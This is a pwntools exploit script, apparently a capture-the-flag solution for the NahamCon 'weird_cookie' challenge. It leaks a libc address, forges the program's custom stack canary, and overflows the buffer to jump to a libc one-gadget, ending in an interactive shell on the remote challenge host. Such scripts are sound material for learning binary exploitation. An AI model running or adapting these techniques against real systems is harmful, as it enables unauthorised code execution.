#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template weird_cookie --host challenge.nahamcon.com --port 31586
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('weird_cookie_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 31804)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
init-peda
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled


# context.log_level = "debug"

libc = ELF("./libc-2.27.so")

padding = 40

io = start()

payload = flat([
    b"A" * 56,
])

io.sendlineafter(b"?\n", payload)

leak = hex(int.from_bytes(io.recvuntil(b"Are").split(b"\n")[1], "little"))

libc.address = int(leak + "00", 16) - (0x021ba0 + 96)

info("libc.address: %#x", libc.address)

canaries = libc.sym["printf"] ^ 1311768467463790321

info("canaries: %#x", canaries)

canaries = p64(canaries)

payload = flat([
    asm('nop') * padding,
    canaries,
    b"\x00" * 8,
    libc.address + 0x10a2fc
])

io.sendlineafter(b".\n", payload)

io.interactive()

